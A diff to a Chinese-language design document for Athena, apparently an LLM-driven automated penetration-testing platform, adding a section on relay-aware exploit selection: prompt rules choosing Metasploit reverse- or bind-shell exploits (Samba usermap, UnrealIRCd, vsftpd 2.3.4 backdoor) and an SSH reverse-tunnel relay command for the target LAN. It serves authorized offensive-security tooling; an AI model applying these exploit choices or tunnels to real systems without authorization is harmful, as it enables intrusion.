@@ -3,7 +3,7 @@
 | 欄位 | 內容 |
 |------|------|
 | **專案** | Athena |
-| **版本** | v0.4.0 |
+| **版本** | v0.5.0 |
 | **最後更新** | 2026-04-10 |
 
 ---
@@ -264,6 +264,49 @@ TechniqueExecution (T1110.001 failed)
 2. OODAController 只**偵測**跨類別 pivot 以廣播事件，不重寫 Decision
 3. Metasploit 以 one-shot mode 運行，不維持 persistent shell（避免 zombie backdoor）
 
+### SPEC-054 Relay Awareness（ADR-047 Accepted 2026-04-10）
+
+Orient pivot 判斷 T1190 reverse shell 類 exploit 時會 consult Section 7.9 `relay_available` 狀態：
+
+```
+Orient._build_user_prompt()
+          │
+          ├── _format_relay_infrastructure() reads settings.RELAY_IP
+          │       │
+          │       ▼
+          │   Section 7.9 INFRASTRUCTURE:
+          │   - relay_available: true|false
+          │   - Relay LHOST: <IP>|(none)
+          │
+          ▼
+ System Prompt Rule #8 "Relay-aware exploit selection":
+    relay_available: false
+       → AVOID: UnrealIRCd / Samba usermap / distccd (reverse shell)
+       → PREFER: vsftpd_234_backdoor (bind shell) or credential-based
+
+ System Prompt Rule #9 (extended):
+    T1190 reverse-shell variant only when relay_available: true
+    T1190 bind-shell variant allowed when banner matches vsftpd 2.3.4
+
+           │
+           ▼
+ metasploit_client.exploit_samba(target_ip)   ← bound method pattern
+          │
+          └── _resolve_lhost(None) → settings.RELAY_IP → LHOST passed
+                                      to _run_exploit options dict
+
+ generate_relay_script CLI + make relay-script
+          │
+          └── User runs ./athena-relay.sh on a machine in target LAN
+              ssh -N -R 4444:athena_host:4444 athena-relay@relay_ip
+              (foreground, trap cleanup EXIT SIGINT SIGTERM, no residue)
+```
+
+**設計三原則（ADR-047 簡化決策）：**
+- **使用者啟動、Athena 產生**：硬體選型由使用者決定，Athena 只提供腳本
+- **零殘留**：foreground + trap，Ctrl+C 即清乾淨
+- **固定單一 LPORT 4444**：符合 SPEC-053 one-shot 精神（不支援並發）
+
 ---
 
 ## 外部依賴
@@ -375,7 +418,7 @@ graph TD
 | [ADR-017](adr/ADR-017-direct-ssh-engine.md) | DirectSSHEngine — SSH 直接執行引擎 | `Accepted` |
 | [ADR-018](adr/ADR-018-technique-playbook-knowledge-base.md) | Technique Playbook 知識庫架構 | `Accepted` |
 | [ADR-046](adr/ADR-046-orient-driven-cross-category-attack-pivot.md) | Orient-Driven Cross-Category Attack Pivot | `Accepted` |
-| [ADR-047](adr/ADR-047-target-segment-relay-for-reverse-shell-connectivity.md) | Target-Segment Relay for Reverse Shell Connectivity | `Draft` |
+| [ADR-047](adr/ADR-047-target-segment-relay-for-reverse-shell-connectivity.md) | Target-Segment Relay for Reverse Shell Connectivity | `Accepted` |
 
 ---
 
